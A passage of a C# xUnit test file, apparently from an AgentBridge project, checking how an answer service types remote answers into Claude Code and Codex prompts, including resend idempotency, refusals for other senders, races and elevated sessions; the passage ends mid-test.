using System.Collections.Concurrent;
using System.Text.Json;
using System.Text.Json.Nodes;
using AgentBridge.Host.Core;
using AgentBridge.Host.Delivery;
using AgentBridge.Protocol;
using Xunit;

// session.answer for Claude Code and Codex, and for the prompts only the machine can answer,
// end to end below the channel: fixture sessions read by the real SessionSource, answered by
// the real AnswerService into a fake injector that plays the agent by writing what it would
// record. The channel itself is the same for every agent (AnswerFlowTests).
public sealed class AgentAnswerFlowTests : IAsyncLifetime
{
    const string ClaudeId = "c1a0de00-0000-4000-8000-000000000001";
    const string CodexId = "c0de0000-0000-4000-8000-000000000002";
    const string CopilotId = "c0b11070-0000-4000-8000-000000000003";

    readonly Fixture f = new();
    readonly Probe probe = new();
    readonly Guard guard = new();
    readonly Injector injector = new();
    readonly ConcurrentQueue<string> logged = new();
    // The answer's time: it moves on only while the answer waits between looks (#486).
    readonly PollClock clock = new();
    SessionSource source = null!;
    string claude = "";
    string rollout = "";
    string ledger = "";
    int second = 10;

    static readonly JsonObject Input = Claude.Ask(("Which database?", false, ["PostgreSQL", "SQLite", "DuckDB"]), ("Which features?", true, ["Auth", "Billing", "Search"]));

    public async Task InitializeAsync()
    {
        claude = f.ClaudeTranscript(ClaudeId);
        f.ClaudeRegistration(ClaudeId, 300, claude);
        Fixture.Append(claude, Claude.User("plan it", 1), Claude.Assistant(2, "tool_use", Claude.ToolUse("toolu_1", "AskUserQuestion", Input)));
        f.Processes.Run(AgentKind.Claude, 300);

        rollout = f.CodexTranscript(CodexId);
        f.CodexRegistration(CodexId, 400, rollout, status: "waiting", updated: Fixture.T0.AddSeconds(5));
        f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: git push", Fixture.T0.AddSeconds(5));
        Fixture.Append(rollout, Codex.Event(new { type = "task_started" }, 1), Codex.Event(new { type = "user_message", message = "push it" }, 1));
        f.Processes.Run(AgentKind.Codex, 400);

        ledger = Path.Combine(f.Root, "profile", "answer-attempts.json");
        source = new SessionSource(f.Options(), f.Processes, TimeProvider.System);
        await source.RefreshAsync();
    }

    public async Task DisposeAsync()
    {
        await source.DisposeAsync();
        await clock.DisposeAsync();
        f.Dispose();
    }

    AnswerService Answerer(Func<string, string?>? codexUnsettled = null, TimeSpan? remembered = null) => new(source, f.Processes, probe, guard, injector, new AnswerOptions
    {
        CodexApprovalsUnsettled = codexUnsettled,
        CopilotHome = f.CopilotHome,
        PlatformSupported = true,
        ConfirmTimeout = TimeSpan.FromSeconds(2),
        PollInterval = TimeSpan.FromMilliseconds(25),
        ClaudeReviewAfter = TimeSpan.FromMilliseconds(300),
        AttemptLedgerPath = ledger,
        RememberFor = remembered ?? TimeSpan.FromMinutes(15),
        Time = clock,
    }, logged.Enqueue);

    static AnswerRequest Request(string session, string question, object fields) => new()
    {
        Id = session,
        Question = question,
        Request = Guid.NewGuid().ToString(),
        Fields = JsonSerializer.SerializeToElement(fields).EnumerateObject().ToDictionary(p => p.Name, p => p.Value.Clone()),
    };

    // The Codex approval's id as the session lists it: "<DecisionId>#<digest>" (#958).
    string CodexQuestion => source.Get(CodexId)!.Question!.Id;

    static readonly Dictionary<string, object> Chosen = new() { ["Which database?"] = "SQLite", ["Which features?"] = new[] { "Auth", "Search" } };

    string Recorded(string database = "SQLite", string features = "Auth, Search") =>
        Claude.Answered("toolu_1", second++, new Dictionary<string, string> { ["Which database?"] = database, ["Which features?"] = features });

    [Fact]
    public async Task A_resend_after_the_answer_service_restarts_returns_the_recorded_outcome_without_typing()
    {
        var request = Request(CodexId, CodexQuestion, new { decision = "approve" });
        var first = await Answerer().AnswerAsync(request);
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        Assert.Single(injector.Plans);

        var afterRestart = await Answerer().AnswerAsync(request);
        Assert.Equal(first, afterRestart);
        Assert.Single(injector.Plans);
    }

    [Fact]
    public async Task A_failure_recording_an_outcome_after_typing_stays_unconfirmed_after_restart()
    {
        var request = Request(CodexId, CodexQuestion, new { decision = "approve" });
        injector.OnInject = _ => Directory.CreateDirectory(ledger + ".tmp");

        var first = await Answerer().AnswerAsync(request);
        var repeated = await Answerer().AnswerAsync(request);

        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        Assert.Equal(AnswerOutcome.Unconfirmed, repeated.Outcome);
        Assert.Single(injector.Plans);
    }

    [Fact]
    public async Task A_resend_during_and_after_a_planned_stop_never_types_the_claimed_answer_twice()
    {
        var gate = new DeliveryGate();
        var blocked = new BlockingInjector();
        var options = new AnswerOptions
        {
            CopilotHome = f.CopilotHome,
            PlatformSupported = true,
            ConfirmTimeout = TimeSpan.FromSeconds(2),
            PollInterval = TimeSpan.FromMilliseconds(25),
            AttemptLedgerPath = ledger,
            Time = clock,
        };
        var answerer = new AnswerService(gate, source, f.Processes, probe, guard, blocked, options);
        var request = Request(CodexId, CodexQuestion, new { decision = "approve" });
        var first = answerer.AnswerAsync(request);
        await blocked.Entered.Task.WaitAsync(TimeSpan.FromSeconds(10));
        var stopping = gate.PrepareStopAsync(TimeSpan.FromSeconds(10));
        var during = answerer.AnswerAsync(request);
        Assert.False(stopping.IsCompleted);
        Assert.False(during.IsCompleted);

        blocked.Release.SetResult();
        var outcome = await first.WaitAsync(TimeSpan.FromSeconds(10));
        using var prepared = await stopping.WaitAsync(TimeSpan.FromSeconds(10));
        Assert.NotNull(prepared);
        Assert.Equal(AnswerOutcome.Unconfirmed, outcome.Outcome);
        // A repeat within the service says nothing was typed again (#1100); after a restart the recorded outcome is returned.
        var resent = await during.WaitAsync(TimeSpan.FromSeconds(10));
        Assert.Equal((outcome.Outcome, outcome.Stage), (resent.Outcome, resent.Stage));
        var again = await answerer.AnswerAsync(request);
        Assert.Equal((outcome.Outcome, outcome.Stage), (again.Outcome, again.Stage));
        Assert.Equal(outcome, await new AnswerService(new DeliveryGate(), source, f.Processes, probe, guard, blocked, options).AnswerAsync(request));
        Assert.Equal(1, blocked.Calls);
    }

    [Fact]
    public async Task A_claimed_question_is_published_at_the_machine_without_changing_the_delivery_guard()
    {
        var attempts = new AttemptLedger(ledger);
        await using var published = new SessionSource(f.Options(), f.Processes, answerAttempted: attempts.IsClaimed);
        await published.RefreshAsync();
        using var subscription = published.Subscribe();
        Assert.NotEqual(true, published.Get(CodexId)!.Question!.AnswerAtMachine);

        Assert.Null(attempts.Claim(AttemptLedger.Key("codex", CodexId, "node-1"), Guid.NewGuid()));
        await published.RefreshAsync();

        Assert.True(published.Get(CodexId)!.Question!.AnswerAtMachine);
        Assert.NotEqual(true, published.GetForDelivery(CodexId)!.Question!.AnswerAtMachine);
        Assert.True(published.List().Sessions.Single(s => s.Id == CodexId).Question!.AnswerAtMachine);
        var upsert = await subscription.Events.ReadAsync().AsTask().WaitAsync(TimeSpan.FromSeconds(10));
        while (upsert.Name != Events.SessionUpsert || ((Session)upsert.Data).Id != CodexId
            || ((Session)upsert.Data).Question?.AnswerAtMachine != true)
        {
            upsert = await subscription.Events.ReadAsync().AsTask().WaitAsync(TimeSpan.FromSeconds(10));
        }
        Assert.True(((Session)upsert.Data).Question!.AnswerAtMachine);
    }

    [Fact]
    public async Task A_Claude_answer_the_transcript_then_records_by_its_tool_use_id_is_delivered()
    {
        injector.OnInject = _ => Fixture.Append(claude, Recorded());

        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(new AnswerResult(AnswerOutcome.Delivered), result);
        var (pid, plan) = Assert.Single(injector.Plans);
        Assert.Equal(300, pid);
        Assert.Equal([KeyPlan.Down, "1", "3", KeyPlan.Down + KeyPlan.Down + KeyPlan.Down + KeyPlan.Down], plan.Sends.Select(s => s.Text));
    }

    [Fact]
    public async Task A_Claude_prompt_left_on_its_review_screen_gets_exactly_one_more_Enter()
    {
        // Nothing is recorded until the Enter that submits the review screen.
        injector.OnInject = plan => { if (plan.Sends is [{ Text: "", Enter: true }]) { Fixture.Append(claude, Recorded()); } };

        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(AnswerOutcome.Delivered, result.Outcome);
        Assert.Equal(2, injector.Plans.Count);
        Assert.Equal([("", true)], injector.Plans[1].Plan.Sends.Select(s => (s.Text, s.Enter)));
    }

    [Fact]
    public async Task A_Claude_prompt_that_never_records_an_answer_gets_one_Enter_and_is_unconfirmed()
    {
        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(AnswerOutcome.Unconfirmed, result.Outcome);
        Assert.Contains("did not record an answer", result.Reason);
        Assert.DoesNotContain("at the machine", result.Reason);
        Assert.Equal(2, injector.Plans.Count);
    }

    [Fact]
    public async Task A_Claude_transcript_that_cannot_be_read_types_nothing_and_never_earns_the_review_Enter()
    {
        // Gone after the keys: nothing says the question is still unanswered, so no Enter.
        injector.OnInject = _ => File.Delete(claude);
        var typed = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));
        Assert.Equal(AnswerOutcome.Unconfirmed, typed.Outcome);
        Assert.Single(injector.Plans);

        // Gone before them: nothing is typed at all.
        Fixture.Append(claude, Claude.Assistant(second++, "tool_use", Claude.ToolUse("toolu_2", "AskUserQuestion", Input)));
        await source.RefreshAsync();
        File.Delete(claude);
        var refused = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_2", Chosen));
        Assert.Equal(AnswerOutcome.Refused, refused.Outcome);
        Assert.Contains("could not be read", refused.Reason);
        Assert.Single(injector.Plans);
    }

    [Fact]
    public async Task A_different_answer_recorded_by_Claude_is_unconfirmed_never_delivered()
    {
        injector.OnInject = _ => Fixture.Append(claude, Recorded(database: "DuckDB"));

        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(AnswerOutcome.Unconfirmed, result.Outcome);
        Assert.Contains("different answer", result.Reason);
        Assert.DoesNotContain("at the machine", result.Reason);
    }

    [Theory]
    // An answer left unconfirmed (typed and never recorded, or its keys interrupted part way),
    // then recorded by Claude: the same request sent again reads the record without typing
    // anything, delivered when it is the answer typed, stage recorded when it is another (#510
    // review, Copilot 4481278490).
    [InlineData(false, true)]
    [InlineData(false, false)]
    [InlineData(true, true)]
    [InlineData(true, false)]
    public async Task A_Claude_answer_left_unconfirmed_is_read_back_by_the_same_request_with_nothing_typed_again(bool interrupted, bool same)
    {
        if (interrupted) { injector.Result = new InjectionResult(InjectionStatus.Interrupted, "the console stopped taking keys"); }
        var answerer = Answerer();
        var request = Request(ClaudeId, "toolu_1", Chosen);

        var first = await answerer.AnswerAsync(request);
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        var typed = injector.Plans.Count;
        Assert.Equal(interrupted ? 1 : 2, typed);

        Fixture.Append(claude, same ? Recorded() : Recorded(database: "DuckDB"));
        var again = await answerer.AnswerAsync(request);

        if (same) { Assert.Equal(new AnswerResult(AnswerOutcome.Delivered), again); }
        else
        {
            Assert.Equal((AnswerOutcome.Unconfirmed, AnswerStage.Recorded), (again.Outcome, again.Stage));
            // A resend says only that nothing was typed again; the stage still says what the session recorded.
            Assert.Equal(DeliveryReasons.AnswerNotConfirmed, again.Reason);
        }
        Assert.Equal(typed, injector.Plans.Count);
    }

    [Fact]
    public async Task A_Claude_question_answered_at_the_machine_a_moment_ago_is_stale_and_nothing_is_typed()
    {
        // In the transcript before the host's own view has caught up.
        Fixture.Append(claude, Recorded());

        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "the question has already been answered"), result);
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_prompt_once_typed_into_is_never_typed_into_again_by_a_new_request_or_after_a_restart()
    {
        // The first attempt reaches the prompt, which records nothing.
        Assert.Equal(AnswerOutcome.Unconfirmed, (await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
        var typed = injector.Plans.Count;

        var again = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));
        Assert.Equal(AnswerOutcome.Refused, again.Outcome);
        Assert.Contains("already typed into this prompt once", again.Reason);

        var codex = Answerer();
        Assert.Equal(AnswerOutcome.Unconfirmed, (await codex.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }))).Outcome);
        Assert.Equal(AnswerOutcome.Refused, (await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "deny" }))).Outcome);
        Assert.Equal(typed + 1, injector.Plans.Count);
    }

    // #1093: the phone reloaded (its request UUIDs are kept in memory only), or a second device
    // answered, and the same answer went again under a new UUID while the prompt, typed into,
    // still showed as asked. That is the first request sent again, not a second attempt.
    [Fact]
    public async Task The_same_answer_sent_again_under_a_new_request_gets_the_first_outcome_and_types_nothing()
    {
        var answerer = Answerer();
        var first = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        var typed = injector.Plans.Count;

        var again = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, again);
        Assert.Equal(typed, injector.Plans.Count);
    }

    [Fact]
    public async Task The_same_answer_under_a_new_request_reads_the_record_again_so_one_recorded_since_comes_back_delivered()
    {
        var answerer = Answerer();
        Assert.Equal(AnswerOutcome.Unconfirmed, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
        var typed = injector.Plans.Count;

        Fixture.Append(claude, Recorded());
        var again = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(new AnswerResult(AnswerOutcome.Delivered), again);
        Assert.Equal(typed, injector.Plans.Count);
        // Delivered from then on, for this one's own UUID resent as for the first's.
        var third = Request(ClaudeId, "toolu_1", Chosen);
        Assert.Equal(AnswerOutcome.Delivered, (await answerer.AnswerAsync(third)).Outcome);
        Assert.Equal(AnswerOutcome.Delivered, (await answerer.AnswerAsync(third)).Outcome);
        Assert.Equal(typed, injector.Plans.Count);
    }

    [Fact]
    public async Task The_same_answer_under_a_new_request_while_the_first_is_being_typed_gets_its_outcome_not_busy()
    {
        var answerer = Answerer();
        Task<AnswerResult>? resent = null;
        injector.OnInject = _ =>
        {
            resent ??= answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));
            Fixture.Append(claude, Recorded());
        };

        var first = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(new AnswerResult(AnswerOutcome.Delivered), first);
        Assert.Equal(first, await resent!);
        Assert.Single(injector.Plans);
    }

    // The request's own record is forgotten after RememberFor; the prompt's first answer is kept
    // with its outcome for as long as the ledger keeps the claim, so a late resend of the same
    // request or of the same answer still gets it rather than the refusal.
    [Fact]
    public async Task The_first_outcome_is_still_given_to_the_same_answer_once_the_request_s_own_record_is_forgotten()
    {
        var answerer = Answerer(remembered: TimeSpan.FromTicks(-1));
        var request = Request(ClaudeId, "toolu_1", Chosen);
        var first = await answerer.AnswerAsync(request);
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        var typed = injector.Plans.Count;

        Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, await answerer.AnswerAsync(request));
        Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen)));
        Assert.Equal(typed, injector.Plans.Count);
    }

    // #1093 review: the memory of a first answer must not tell a stranger whether a guess was
    // right. The same text from another sender goes the usual way, and is refused exactly as
    // other text is; only the sender of the first answer is given its outcome again.
    [Fact]
    public async Task Another_sender_giving_the_identical_text_gets_the_same_refusal_as_one_giving_other_text_and_only_the_first_sender_gets_the_outcome()
    {
        var answerer = Answerer();
        var first = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "phone");
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        var typed = injector.Plans.Count;
        var other = new Dictionary<string, object> { ["Which database?"] = "DuckDB", ["Which features?"] = new[] { "Auth", "Search" } };

        var guessed = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "laptop");
        var missed = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", other), sender: "laptop");

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "an answer was already typed into this prompt once, and is never typed again"), guessed);
        Assert.Equal(missed, guessed);
        Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "phone"));
        Assert.Equal(typed, injector.Plans.Count);
    }

    // #1100 review (Codex): a second device sending the same answer while the first call has
    // registered as the prompt's first but not yet reached the request cache must join that
    // one delivery, not start another beside it: one delivery per prompt, its outcome kept with
    // the registered record, so a later identical submission gets it rather than the refusal.
    [Fact]
    public async Task An_identical_answer_arriving_while_the_first_is_between_registering_and_starting_joins_its_delivery_and_its_outcome_is_kept()
    {
        var answerer = Answerer();
        using var registered = new ManualResetEventSlim();
        using var otherDone = new ManualResetEventSlim();
        var held = 0;
        answerer.AfterRegistered = () =>
        {
            if (Interlocked.Increment(ref held) != 1) { return; }
            registered.Set();
            // The other call may finish meanwhile, where nothing stops it starting a delivery of its own.
            otherDone.Wait(TimeSpan.FromSeconds(1));
        };

        var one = Task.Run(() => answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "phone"));
        registered.Wait();
        var same = Task.Run(async () =>
        {
            var result = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "phone");
            otherDone.Set();
            return result;
        });
        var results = await Task.WhenAll(one, same);

        // The second call joined: one real outcome, one that says nothing was typed again.
        Assert.All(results, r => Assert.Equal(AnswerOutcome.Unconfirmed, r.Outcome));
        Assert.Single(results, r => r.Reason != DeliveryReasons.AnswerNotConfirmed);
        Assert.Equal(2, injector.Plans.Count);
        // And the outcome was kept with the registered record: a later submission gets it, not the refusal.
        var later = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "phone");
        Assert.Equal((AnswerOutcome.Unconfirmed, DeliveryReasons.AnswerNotConfirmed), (later.Outcome, later.Reason));
        // Another sender is still refused plainly.
        Assert.Equal(AnswerOutcome.Refused, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen), sender: "laptop")).Outcome);
        Assert.Equal(2, injector.Plans.Count);
    }

    // #1093 review (Sol): a request UUID belongs to the sender, session and question it was
    // admitted for. Another sender replaying the first request's own UUID, with that question or
    // any other, gets what its own fresh request would (the refusal other text gets, or stale for
    // a question the session is not asking), whether the request's own record is still there or
    // not, and never the first's outcome or its progress.
    [Theory]
    [InlineData(false, false)]
    [InlineData(true, false)]
    [InlineData(false, true)]
    [InlineData(true, true)]
    public async Task Another_sender_replaying_the_first_requests_own_UUID_gets_what_a_request_of_its_own_would_and_not_its_outcome(bool forgotten, bool otherQuestion)
    {
        var answerer = Answerer(remembered: forgotten ? TimeSpan.FromTicks(-1) : null);
        var request = Request(ClaudeId, "toolu_1", Chosen);
        var first = await answerer.AnswerAsync(request, sender: "phone");
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        var typed = injector.Plans.Count;
        var other = new Dictionary<string, object> { ["Which database?"] = "DuckDB", ["Which features?"] = new[] { "Auth", "Search" } };
        var question = otherQuestion ? "toolu_elsewhere" : "toolu_1";
        var heard = 0;

        var replayed = await answerer.AnswerAsync(request with { Question = question }, watch: new DeliveryWatch(_ => heard++), sender: "laptop");
        var missed = await answerer.AnswerAsync(Request(ClaudeId, question, otherQuestion ? Chosen : other), sender: "laptop");

        Assert.Equal(otherQuestion ? AnswerOutcome.Stale : AnswerOutcome.Refused, replayed.Outcome);
        Assert.Equal(missed, replayed);
        Assert.Equal(0, heard);
        // The first sender's own resend is unaffected.
        Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, await answerer.AnswerAsync(request, sender: "phone"));
        Assert.Equal(typed, injector.Plans.Count);
    }

    // #1093 review (Sol): whether a call is a repeat is decided where the request is admitted,
    // so calls racing for one request cannot each be taken for the first: exactly one is typed
    // and gives the real outcome, every other says nothing was typed again.
    [Fact]
    public async Task Identical_calls_racing_for_one_request_type_once_and_every_other_says_nothing_was_typed_again()
    {
        for (var round = 0; round < 6; round++)
        {
            if (File.Exists(ledger)) { File.Delete(ledger); }
            injector.Plans.Clear();
            injector.OnInject = _ => Thread.Sleep(30);
            var answerer = Answerer();
            var request = Request(ClaudeId, "toolu_1", Chosen);
            using var start = new ManualResetEventSlim();

            var calls = Enumerable.Range(0, 16).Select(_ => Task.Run(() => { start.Wait(); return answerer.AnswerAsync(request, sender: "phone"); })).ToList();
            start.Set();
            var results = await Task.WhenAll(calls);

            Assert.Equal(2, injector.Plans.Count);
            Assert.All(results, r => Assert.Equal(AnswerOutcome.Unconfirmed, r.Outcome));
            Assert.Single(results, r => r.Reason != DeliveryReasons.AnswerNotConfirmed);
            Assert.Equal(15, results.Count(r => r.Reason == DeliveryReasons.AnswerNotConfirmed));
        }
    }

    // The same, for retries of a settled unconfirmed answer, under its own UUID and new ones at once.
    [Fact]
    public async Task Identical_retries_racing_after_an_unconfirmed_answer_all_say_nothing_was_typed_again_and_type_nothing()
    {
        var answerer = Answerer();
        var request = Request(ClaudeId, "toolu_1", Chosen);
        var first = await answerer.AnswerAsync(request, sender: "phone");
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);
        var typed = injector.Plans.Count;

        for (var wave = 0; wave < 5; wave++)
        {
            using var start = new ManualResetEventSlim();
            var calls = Enumerable.Range(0, 16)
                .Select(i => Task.Run(() => { start.Wait(); return answerer.AnswerAsync(i % 2 == 0 ? request : Request(ClaudeId, "toolu_1", Chosen), sender: "phone"); })).ToList();
            start.Set();

            Assert.All(await Task.WhenAll(calls), r => Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, r));
        }
        Assert.Equal(typed, injector.Plans.Count);
    }

    // #1093 review (Sol): every identical retry of an unconfirmed answer says the same, under the
    // same UUID or a new one, whatever the stage: the first attempt's own words are not its to say.
    [Theory]
    [InlineData(false, false)]
    [InlineData(false, true)]
    [InlineData(true, false)]
    [InlineData(true, true)]
    public async Task Every_identical_retry_of_an_unconfirmed_answer_says_nothing_was_typed_again_until_the_session_confirms_it(bool sameRequest, bool forgotten)
    {
        var answerer = Answerer(remembered: forgotten ? TimeSpan.FromTicks(-1) : null);
        var request = Request(ClaudeId, "toolu_1", Chosen);
        var first = await answerer.AnswerAsync(request);
        Assert.Equal((AnswerOutcome.Unconfirmed, AnswerStage.Typed), (first.Outcome, first.Stage));
        Assert.NotEqual(DeliveryReasons.AnswerNotConfirmed, first.Reason);
        var typed = injector.Plans.Count;

        for (var retry = 0; retry < 2; retry++)
        {
            var again = await answerer.AnswerAsync(sameRequest ? request : Request(ClaudeId, "toolu_1", Chosen));
            Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, again);
        }

        Fixture.Append(claude, Recorded());
        Assert.Equal(new AnswerResult(AnswerOutcome.Delivered), await answerer.AnswerAsync(sameRequest ? request : Request(ClaudeId, "toolu_1", Chosen)));
        Assert.Equal(typed, injector.Plans.Count);
    }

    [Theory]
    [InlineData(false, false)]
    [InlineData(false, true)]
    [InlineData(true, false)]
    [InlineData(true, true)]
    public async Task A_retry_of_an_answer_the_session_recorded_differently_keeps_its_stage_and_says_nothing_was_typed_again(bool sameRequest, bool forgotten)
    {
        var answerer = Answerer(remembered: forgotten ? TimeSpan.FromTicks(-1) : null);
        var request = Request(ClaudeId, "toolu_1", Chosen);
        Assert.Equal(AnswerOutcome.Unconfirmed, (await answerer.AnswerAsync(request)).Outcome);
        var typed = injector.Plans.Count;

        Fixture.Append(claude, Recorded(database: "DuckDB"));
        var again = await answerer.AnswerAsync(sameRequest ? request : Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal((AnswerOutcome.Unconfirmed, AnswerStage.Recorded, DeliveryReasons.AnswerNotConfirmed), (again.Outcome, again.Stage, again.Reason));
        Assert.Equal(typed, injector.Plans.Count);
    }

    [Fact]
    public async Task An_unconfirmed_first_answer_is_read_again_for_an_identical_retry_long_after_the_request_s_own_record_is_forgotten()
    {
        var answerer = Answerer(remembered: TimeSpan.FromTicks(-1));
        Assert.Equal(AnswerOutcome.Unconfirmed, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
        var typed = injector.Plans.Count;

        Fixture.Append(claude, Recorded());
        var again = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(new AnswerResult(AnswerOutcome.Delivered), again);
        Assert.Equal(typed, injector.Plans.Count);
        // And it stays delivered.
        Assert.Equal(AnswerOutcome.Delivered, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
    }

    [Fact]
    public async Task A_different_answer_to_a_prompt_already_typed_into_is_still_refused_and_types_nothing()
    {
        var answerer = Answerer();
        Assert.Equal(AnswerOutcome.Unconfirmed, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
        var typed = injector.Plans.Count;

        var other = await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", new Dictionary<string, object> { ["Which database?"] = "DuckDB", ["Which features?"] = new[] { "Auth", "Search" } }));

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "an answer was already typed into this prompt once, and is never typed again"), other);
        Assert.Equal(typed, injector.Plans.Count);
    }

    [Fact]
    public async Task A_Codex_approval_answered_again_the_same_way_under_a_new_request_gets_the_first_outcome_and_the_other_decision_is_refused()
    {
        var answerer = Answerer();
        var first = await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }));
        Assert.Equal(AnswerOutcome.Unconfirmed, first.Outcome);

        Assert.Equal(first with { Reason = DeliveryReasons.AnswerNotConfirmed }, await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" })));
        var denied = await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "deny" }));

        Assert.Equal(AnswerOutcome.Refused, denied.Outcome);
        Assert.Single(injector.Plans);
    }

    [Fact]
    public async Task An_answer_that_reached_nothing_does_not_hand_its_refusal_to_the_same_answer_sent_again()
    {
        var answerer = Answerer();
        injector.Result = new InjectionResult(InjectionStatus.NothingTyped, "could not attach to the session's console");
        Assert.Equal(AnswerOutcome.Refused, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);

        injector.Result = new InjectionResult(InjectionStatus.Typed, "ok");
        injector.OnInject = _ => Fixture.Append(claude, Recorded());
        Assert.Equal(AnswerOutcome.Delivered, (await answerer.AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
    }

    [Fact]
    public async Task Nothing_reaching_the_console_releases_the_prompt_to_be_answered_again()
    {
        injector.Result = new InjectionResult(InjectionStatus.NothingTyped, "could not attach to the session's console");
        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "could not attach to the session's console"), await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen)));
        // #995: a worker that did not start is the machine not delivering it, in the answer's words.
        injector.Result = new InjectionResult(InjectionStatus.NothingTyped, AgentBridge.Host.Delivery.Windows.WorkerInjector.NotStarted);
        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "the machine couldn't deliver it"), await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen)));

        injector.Result = new InjectionResult(InjectionStatus.Typed, "ok");
        injector.OnInject = _ => Fixture.Append(claude, Recorded());
        Assert.Equal(AnswerOutcome.Delivered, (await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen))).Outcome);
    }

    // #995: the person is told the fact in fixed words; why the ledger could not be written goes
    // to the host's log only (#802).
    [Fact]
    public async Task An_attempt_that_cannot_be_recorded_types_nothing()
    {
        Directory.CreateDirectory(ledger + ".tmp");

        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "the machine couldn't deliver it"), result);
        Assert.Contains(logged, l => l.Contains("could not be recorded", StringComparison.Ordinal));
        Assert.Empty(injector.Plans);
    }

    // #995, #802: an exception's words never reach the person. The injector failing as it types is
    // "the machine couldn't deliver it", and what it said is in the host's log.
    [Fact]
    public async Task An_injector_that_throws_while_typing_an_answer_says_only_that_the_machine_couldnt_deliver_it_and_logs_why()
    {
        injector.OnInject = _ => throw new IOException("pipe 0xC0FFEE to the worker broke");

        var result = await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen));

        Assert.Equal(AnswerOutcome.Unconfirmed, result.Outcome);
        Assert.Equal("the machine couldn't deliver it", result.Reason);
        Assert.Contains(logged, l => l.Contains("pipe 0xC0FFEE to the worker broke", StringComparison.Ordinal));
    }

    [Fact]
    public async Task An_elevated_Claude_or_Codex_session_is_refused_untyped()
    {
        guard.Reason = "the session runs as administrator";

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, guard.Reason), await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen)));
        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, guard.Reason), await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" })));
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task Agent_ha_bridge_starting_before_the_keys_go_stops_a_Claude_answer_and_a_Codex_approval()
    {
        probe.Answers = new Queue<string?>([null, "agent-ha-bridge is running for this user", null, "agent-ha-bridge is running for this user"]);

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "agent-ha-bridge is running for this user"), await Answerer().AnswerAsync(Request(ClaudeId, "toolu_1", Chosen)));
